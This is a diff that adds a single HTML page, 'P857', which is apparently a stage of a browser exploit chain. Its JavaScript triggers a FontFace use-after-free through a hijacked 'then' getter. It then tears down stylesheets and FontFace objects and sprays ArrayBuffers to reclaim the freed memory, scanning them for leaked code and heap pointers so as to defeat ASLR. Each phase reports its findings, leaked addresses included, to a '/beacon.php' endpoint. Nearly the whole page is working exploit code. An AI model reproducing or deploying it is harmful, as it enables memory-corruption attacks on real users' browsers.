@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P857</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P857: CSS Teardown Vtable Hunt</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P857-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+bn('BOOT','start');
+log('CSS teardown vtable residue hunt','info');
+log('Insight: FontFace UAF leaves residue (q0,q11,q13) because CSS','info');
+log('style teardown free path does NOT zero memory. Other CSS objects','info');
+log('(StyleRule, CSSFontFaceRule, CSSStyleSheet) HAVE vtables!','info');
+log('If they leave residue too, we get a CODE pointer = ASLR defeat.','info');
+log('','');
+
+function isCodePtr(bv) {
+  if (bv === 0n) return false;
+  if (bv === 0xFFFFFFFFFFFFFFFFn) return false;
+  if (bv === 0xFFFFFFFF00000000n) return false;
+  var hi = Number(bv >> 32n);
+  var lo = Number(bv & 0xFFFFFFFFn);
+  if (hi >= 0x10 && hi <= 0x1F) return false;
+  if (hi >= 1 && hi <= 0xFF && lo > 0) return true;
+  return false;
+}
+function isAnyPtr(bv) {
+  if (bv === 0n) return false;
+  if (bv === 0xFFFFFFFFFFFFFFFFn) return false;
+  if (bv === 0xFFFFFFFF00000000n) return false;
+  if (bv === 1n) return false;
+  var hi = Number(bv >> 32n);
+  if (hi >= 1 && hi <= 0xFF) return true;
+  return false;
+}
+function isNonZero(bv) { return bv !== 0n; }
+
+function scanABs(label, allABs) {
+  var totalCode = 0, totalAny = 0, totalNZ = 0;
+  var codeHits = [], anyHits = [], nzSamples = [];
+  for (var sz in allABs) {
+    var abs = allABs[sz];
+    var sizeCode = 0, sizeAny = 0, sizeNZ = 0;
+    for (var i = 0; i < abs.length; i++) {
+      var bv = new BigUint64Array(abs[i]);
+      for (var j = 0; j < bv.length; j++) {
+        var v = bv[j];
+        if (isCodePtr(v)) {
+          sizeCode++; totalCode++;
+          if (codeHits.length < 10) codeHits.push('sz' + sz + '[' + i + '][' + j + ']=0x' + v.toString(16));
+        }
+        if (isAnyPtr(v)) {
+          sizeAny++; totalAny++;
+          if (anyHits.length < 15) anyHits.push('sz' + sz + '[' + i + '][' + j + ']=0x' + v.toString(16));
+        }
+        if (isNonZero(v)) {
+          sizeNZ++; totalNZ++;
+          if (nzSamples.length < 8) nzSamples.push('sz' + sz + '[' + i + '][' + j + ']=0x' + v.toString(16));
+        }
+      }
+    }
+    if (sizeCode > 0) log('  ' + label + ' SIZE ' + sz + ': ' + sizeCode + ' CODE PTR HITS!', 'hot');
+    if (sizeAny > 0 && sizeCode === 0) log('  ' + label + ' SIZE ' + sz + ': ' + sizeAny + ' heap ptr hits', 'info');
+  }
+  if (totalNZ > 0 && totalCode === 0 && totalAny === 0) {
+    log('  ' + label + ': ' + totalNZ + ' nonzero qwords (no ptrs)', 'info');
+  }
+  var r = 'code=' + totalCode + '|any=' + totalAny + '|nz=' + totalNZ;
+  if (codeHits.length > 0) r += '|codeH=' + codeHits.join(';');
+  if (anyHits.length > 0) r += '|anyH=' + anyHits.join(';');
+  if (nzSamples.length > 0) r += '|nzS=' + nzSamples.join(';');
+  return r;
+}
+
+/* ============================================================
+ * PHASE A: Baseline FontFace UAF (confirm residue path works)
+ * ============================================================ */
+log('=== PHASE A: FontFace UAF baseline ===','hot');
+bn('PHASE-A','start');
+
+var mH = null, mQ13 = null, mSlot = -1;
+try {
+  var stM = document.createElement('style');
+  stM.textContent = "@font-face{font-family:bbA;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(stM);
+  var faceM = new FontFace('fA', "local('Helvetica')", {unicodeRange: 'U+0041'});
+  document.fonts.add(faceM);
+  void faceM.loaded;
+  var mFired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (mFired) return undefined;
+      mFired = true;
+      if (stM) { stM.remove(); stM.textContent = ''; stM = null; }
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      var mABs = [];
+      for (var i = 0; i < 80; i++) mABs.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em bbA'); } catch(e) {}
+      document.body.offsetHeight;
+      window.__mABs = mABs;
+      return undefined;
+    }, set: function() {}
+  });
+  document.fonts.load('1em fA, bbA', 'AB');
+} catch(e) {
+  log('  FontFace setup err: ' + e.message, 'fail');
+  bn('PHASE-A-ERR', e.message.slice(0,200));
+}
+
+setTimeout(function() {
+  delete FontFace.prototype.then;
+  if (window.__mABs) {
+    for (var i = 0; i < window.__mABs.length; i++) {
+      var bv = new BigUint64Array(window.__mABs[i]);
+      var nz = 0;
+      for (var j = 0; j < bv.length; j++) if (bv[j] !== 0n) nz++;
+      if (nz >= 2) {
+        mSlot = i;
+        var q11 = bv[11], q13 = bv[13];
+        var h11 = Number(q11 >> 32n), l11 = Number(q11 & 0xFFFFFFFFn);
+        mH = '0x' + q11.toString(16);
+        mQ13 = '0x' + q13.toString(16);
+        log('  FontFace UAF HIT slot=' + i + ' H=' + mH + ' q13=' + mQ13, 'ok');
+        break;
+      }
+    }
+    if (mSlot < 0) log('  FontFace UAF: no reclaim hit', 'fail');
+  } else {
+    log('  FontFace UAF: then getter not fired', 'fail');
+  }
+  bn('PHASE-A-RESULT', 'slot=' + mSlot + '|H=' + mH + '|q13=' + mQ13);
+  setTimeout(phaseB, 50);
+}, 200);
+
+/* ============================================================
+ * PHASE B: Mass CSS rule creation + teardown + AB spray
+ * Create diverse CSS rules (each creates different C++ objects)
+ * Remove the style element → triggers CSS teardown
+ * Spray ABs at sizes matching CSS object sizes
+ * ============================================================ */
+function phaseB() {
+  log('','');
+  log('=== PHASE B: CSS rule teardown + multi-size spray ===','hot');
+  bn('PHASE-B','start');
+
+  try {
+    /* Create style with MANY diverse rules */
+    var css = '';
+    /* @font-face rules (CSSFontFaceRule + StyleRule + CSSFontFace ~192B) */
+    for (var i = 0; i < 30; i++) {
+      css += '@font-face{font-family:tf' + i + ';src:local(Arial);font-weight:' + ((i % 9) * 100 + 100) + ';}\n';
+    }
+    /* @keyframes rules (CSSKeyframesRule + CSSKeyframeRule objects) */
+    for (var i = 0; i < 20; i++) {
+      css += '@keyframes ka' + i + '{0%{opacity:0.' + i + '}50%{opacity:1}100%{opacity:0.' + i + '}}\n';
+    }
+    /* @media rules (CSSMediaRule + MediaQuerySet) */
+    for (var i = 0; i < 10; i++) {
+      css += '@media(min-width:' + (i * 100) + 'px){.m' + i + '{color:red}}\n';
+    }
+    /* Regular style rules (StyleRule + CSSStyleDeclaration + MutableStyleProperties) */
+    for (var i = 0; i < 50; i++) {
+      css += '.r' + i + '{color:rgb(' + i + ',' + (i*2) + ',' + (i*3) + ');margin:' + i + 'px;padding:' + (i+1) + 'px;border:' + i + 'px solid;font-size:' + (10+i) + 'px;}\n';
+    }
+    /* @supports rules */
+    for (var i = 0; i < 5; i++) {
+      css += '@supports(display:flex){.s' + i + '{display:flex}}\n';
+    }
+
+    var st = document.createElement('style');
+    st.textContent = css;
+    document.head.appendChild(st);
+    document.body.offsetHeight; /* Force style parse */
+
+    var ruleCount = 0;
+    try { ruleCount = st.sheet.cssRules.length; } catch(e) {}
+    log('  Created style with ' + ruleCount + ' rules (' + css.length + ' chars)', 'info');
+    bn('PHASE-B-CREATED', 'rules=' + ruleCount + '|chars=' + css.length);
+
+    /* TEARDOWN: remove style element */
+    st.remove();
+    st.textContent = '';
+    st = null;
+    document.body.offsetHeight; /* Force layout/style recalc → frees CSS objects */
+
+    /* IMMEDIATELY spray ABs at CSS-object sizes */
+    var sizes = [32, 48, 64, 80, 96, 112, 128, 160, 192, 224, 256, 320, 384, 512];
+    var allABs = {};
+    for (var s = 0; s < sizes.length; s++) {
+      var sz = sizes[s];
+      var abs = [];
+      for (var i = 0; i < 300; i++) abs.push(new ArrayBuffer(sz));
+      allABs[sz] = abs;
+    }
+
+    var r = scanABs('CSS-teardown', allABs);
+    log('  CSS teardown: ' + r.split('|').slice(0,3).join(' '), r.indexOf('code=0') === 0 ? 'info' : 'hot');
+    bn('PHASE-B-RESULT', r.slice(0, 1600));
+
+  } catch(e) {
+    log('  Phase B error: ' + e.message, 'fail');
+    bn('PHASE-B-ERR', e.message.slice(0,200));
+  }
+
+  setTimeout(phaseC, 30);
+}
+
+/* ============================================================
+ * PHASE C: Multiple style elements + rapid teardown
+ * Create 10 style elements, remove all at once, then spray
+ * More CSS objects = more chances of residue
+ * ============================================================ */
+function phaseC() {
+  log('','');
+  log('=== PHASE C: Multi-stylesheet burst teardown ===','hot');
+  bn('PHASE-C','start');
+
+  try {
+    var sheets = [];
+    for (var s = 0; s < 10; s++) {
+      var css = '';
+      for (var i = 0; i < 20; i++) {
+        css += '@font-face{font-family:mf' + s + '_' + i + ';src:local(Helvetica);}\n';
+        css += '.mc' + s + '_' + i + '{color:rgb(' + (s*25) + ',' + (i*12) + ',100);font:' + (12+i) + 'px serif;}\n';
+      }
+      css += '@keyframes mk' + s + '{from{opacity:0}to{opacity:1}}\n';
+      var st = document.createElement('style');
+      st.textContent = css;
+      document.head.appendChild(st);
+      sheets.push(st);
+    }
+    document.body.offsetHeight;
+    log('  Created ' + sheets.length + ' style elements', 'info');
+
+    /* Remove all at once */
+    for (var s = 0; s < sheets.length; s++) {
+      sheets[s].remove();
+      sheets[s].textContent = '';
+    }
+    sheets = null;
+    document.body.offsetHeight;
+
+    /* Spray */
+    var sizes = [32, 48, 64, 80, 96, 112, 128, 160, 192, 256, 384];
+    var allABs = {};
+    for (var s = 0; s < sizes.length; s++) {
+      var sz = sizes[s];
+      var abs = [];
+      for (var i = 0; i < 400; i++) abs.push(new ArrayBuffer(sz));
+      allABs[sz] = abs;
+    }
+
+    var r = scanABs('Multi-sheet', allABs);
+    log('  Multi-sheet: ' + r.split('|').slice(0,3).join(' '), r.indexOf('code=0') === 0 ? 'info' : 'hot');
+    bn('PHASE-C-RESULT', r.slice(0, 1600));
+
+  } catch(e) {
+    log('  Phase C error: ' + e.message, 'fail');
+    bn('PHASE-C-ERR', e.message.slice(0,200));
+  }
+
+  setTimeout(phaseD, 30);
+}
+
+/* ============================================================
+ * PHASE D: CSSStyleSheet API (CSSOM) + teardown
+ * Use CSSStyleSheet constructor + insertRule for direct CSSOM
+ * Then remove → different teardown path than <style> element
+ * ============================================================ */
+function phaseD() {
+  log('','');
+  log('=== PHASE D: CSSOM CSSStyleSheet API ===','hot');
+  bn('PHASE-D','start');
+
+  try {
+    /* Test if CSSStyleSheet constructor is available */
+    var hasAPI = typeof CSSStyleSheet === 'function';
+    var sheets = [];
+
+    if (hasAPI) {
+      try {
+        for (var s = 0; s < 20; s++) {
+          var sh = new CSSStyleSheet();
+          for (var i = 0; i < 10; i++) {
+            sh.insertRule('.d' + s + '_' + i + '{color:blue;margin:' + i + 'px}', i);
+          }
+          document.adoptedStyleSheets = document.adoptedStyleSheets.concat([sh]);
+          sheets.push(sh);
+        }
+        log('  Created ' + sheets.length + ' adopted stylesheets', 'info');
+
+        /* Remove by clearing adopted list */
+        document.adoptedStyleSheets = [];
+        sheets = null;
+        document.body.offsetHeight;
+
+      } catch(e) {
+        log('  CSSStyleSheet API: ' + e.message, 'info');
+        hasAPI = false;
+      }
+    }
+
+    if (!hasAPI) {
+      /* Fallback: use <style> with insertRule */
+      var st = document.createElement('style');
+      document.head.appendChild(st);
+      for (var i = 0; i < 100; i++) {
+        try { st.sheet.insertRule('.di' + i + '{color:green;padding:' + i + 'px;border:1px solid}', i); } catch(e) {}
+      }
+      document.body.offsetHeight;
+      log('  Created style with ' + (st.sheet.cssRules ? st.sheet.cssRules.length : '?') + ' insertRule rules', 'info');
+
+      /* Delete all rules one by one (different free path than removing <style>) */
+      var len = st.sheet.cssRules ? st.sheet.cssRules.length : 0;
+      for (var i = len - 1; i >= 0; i--) {
+        try { st.sheet.deleteRule(i); } catch(e) {}
+      }
+      document.body.offsetHeight;
+      st.remove();
+      st = null;
+    }
+
+    /* Spray */
+    var sizes = [32, 48, 64, 80, 96, 128, 160, 192, 256];
+    var allABs = {};
+    for (var s = 0; s < sizes.length; s++) {
+      var sz = sizes[s];
+      var abs = [];
+      for (var i = 0; i < 500; i++) abs.push(new ArrayBuffer(sz));
+      allABs[sz] = abs;
+    }
+
+    var r = scanABs('CSSOM', allABs);
+    log('  CSSOM: ' + r.split('|').slice(0,3).join(' '), r.indexOf('code=0') === 0 ? 'info' : 'hot');
+    bn('PHASE-D-RESULT', (hasAPI ? 'api=adopted' : 'api=insertRule') + '|' + r.slice(0, 1400));
+
+  } catch(e) {
+    log('  Phase D error: ' + e.message, 'fail');
+    bn('PHASE-D-ERR', e.message.slice(0,200));
+  }
+
+  setTimeout(phaseE, 30);
+}
+
+/* ============================================================
+ * PHASE E: FontFace object churn (NOT UAF — just create+delete)
+ * Create many FontFace objects, add to fonts, delete all
+ * Each creates CSSFontFace (192B) + CSSFontFaceSource + more
+ * These go through the exact same allocator path as our UAF
+ * ============================================================ */
+function phaseE() {
+  log('','');
+  log('=== PHASE E: FontFace object churn ===','hot');
+  bn('PHASE-E','start');
+
+  try {
+    var faces = [];
+    for (var i = 0; i < 50; i++) {
+      var f = new FontFace('fc' + i, "local('Helvetica')", {unicodeRange: 'U+00' + (41 + (i % 26)).toString(16).toUpperCase()});
+      document.fonts.add(f);
+      faces.push(f);
+    }
+    document.body.offsetHeight;
+    log('  Created ' + faces.length + ' FontFace objects, fonts.size=' + document.fonts.size, 'info');
+
+    /* Delete all */
+    for (var i = 0; i < faces.length; i++) {
+      try { document.fonts.delete(faces[i]); } catch(e) {}
+    }
+    faces = null;
+    document.body.offsetHeight;
+    log('  Deleted all, fonts.size=' + document.fonts.size, 'info');
+
+    /* Spray at CSSFontFace size (192B) and nearby sizes */
+    var sizes = [128, 160, 192, 224, 256, 96, 64, 48, 384];
+    var allABs = {};
+    for (var s = 0; s < sizes.length; s++) {
+      var sz = sizes[s];
+      var abs = [];
+      for (var i = 0; i < 400; i++) abs.push(new ArrayBuffer(sz));
+      allABs[sz] = abs;
+    }
+
+    var r = scanABs('FontFace-churn', allABs);
+    log('  FontFace churn: ' + r.split('|').slice(0,3).join(' '), r.indexOf('code=0') === 0 ? 'info' : 'hot');
+    bn('PHASE-E-RESULT', r.slice(0, 1600));
+
+  } catch(e) {
+    log('  Phase E error: ' + e.message, 'fail');
+    bn('PHASE-E-ERR', e.message.slice(0,200));
+  }
+
+  setTimeout(phaseF, 30);
+}
+
+/* ============================================================
+ * PHASE F: Interleaved FontFace UAF + other-object spray
+ * Key idea: trigger FontFace UAF to free a 192B slot
+ * BUT spray with NON-192B ABs → forces the freed 192B
+ * to be reused by OTHER internal allocations
+ * Then do a SECOND UAF → spray 192B → read what's there
+ * ============================================================ */
+function phaseF() {
+  log('','');
+  log('=== PHASE F: Interleaved UAF + cross-size spray ===','hot');
+  bn('PHASE-F','start');
+
+  try {
+    /* Step 1: Create many other CSS objects that are ~192B */
+    var css2 = '';
+    for (var i = 0; i < 40; i++) {
+      css2 += '@font-face{font-family:xf' + i + ';src:local(Helvetica);font-style:italic;font-weight:' + ((i%9)*100+100) + ';font-display:swap;unicode-range:U+00' + (30+i).toString(16) + ';}\n';
+    }
+    var st2 = document.createElement('style');
+    st2.textContent = css2;
+    document.head.appendChild(st2);
+    document.body.offsetHeight;
+
+    /* Step 2: Remove → free 40 CSSFontFace objects (~192B each with vtable-containing wrappers) */
+    st2.remove();
+    st2.textContent = '';
+    st2 = null;
+    document.body.offsetHeight;
+
+    /* Step 3: DON'T spray 192B ABs — let the freed slots be reused by the engine */
+    /* Instead, create objects that have vtables and are ~192B */
+    /* Create gradient objects (CanvasGradient has C++ vtable) */
+    var tmpC = document.createElement('canvas');
+    tmpC.width = 1; tmpC.height = 1;
+    var tmpCtx = tmpC.getContext('2d');
+    var grads = [];
+    for (var i = 0; i < 200; i++) {
+      grads.push(tmpCtx.createLinearGradient(0, 0, i, i));
+    }
+    /* Create pattern objects */
+    var pats = [];
+    for (var i = 0; i < 50; i++) {
+      try { pats.push(tmpCtx.createPattern(tmpC, 'repeat')); } catch(e) {}
+    }
+
+    /* Step 4: NOW spray 192B ABs to reclaim whatever was freed */
+    var abs192 = [];
+    for (var i = 0; i < 500; i++) abs192.push(new ArrayBuffer(192));
+
+    /* Scan for residue */
+    var totalCode = 0, totalAny = 0, totalNZ = 0;
+    var codeHits = [], anyHits = [], nzSamples = [];
+    for (var i = 0; i < abs192.length; i++) {
+      var bv = new BigUint64Array(abs192[i]);
+      for (var j = 0; j < bv.length; j++) {
+        var v = bv[j];
+        if (v !== 0n) {
+          totalNZ++;
+          if (nzSamples.length < 10) nzSamples.push('[' + i + '][' + j + ']=0x' + v.toString(16));
+        }
+        if (isCodePtr(v)) {
+          totalCode++;
+          if (codeHits.length < 10) codeHits.push('[' + i + '][' + j + ']=0x' + v.toString(16));
+        }
+        if (isAnyPtr(v)) {
+          totalAny++;
+          if (anyHits.length < 10) anyHits.push('[' + i + '][' + j + ']=0x' + v.toString(16));
+        }
+      }
+    }
+
+    grads = null;
+    pats = null;
+
+    log('  Cross-size: code=' + totalCode + ' any=' + totalAny + ' nz=' + totalNZ, (totalCode + totalAny + totalNZ) > 0 ? 'hot' : 'info');
+    if (nzSamples.length > 0) log('  NZ samples: ' + nzSamples.join(', '), 'hot');
+    var r = 'code=' + totalCode + '|any=' + totalAny + '|nz=' + totalNZ;
+    if (codeHits.length > 0) r += '|cH=' + codeHits.join(';');
+    if (anyHits.length > 0) r += '|aH=' + anyHits.join(';');
+    if (nzSamples.length > 0) r += '|nzS=' + nzSamples.join(';');
+    bn('PHASE-F-RESULT', r.slice(0, 1600));
+
+  } catch(e) {
+    log('  Phase F error: ' + e.message, 'fail');
+    bn('PHASE-F-ERR', e.message.slice(0,200));
+  }
+
+  log('','');
+  log('====== P857 COMPLETE ======','hot');
+  bn('DONE','complete');
+}
+</script></body></html>
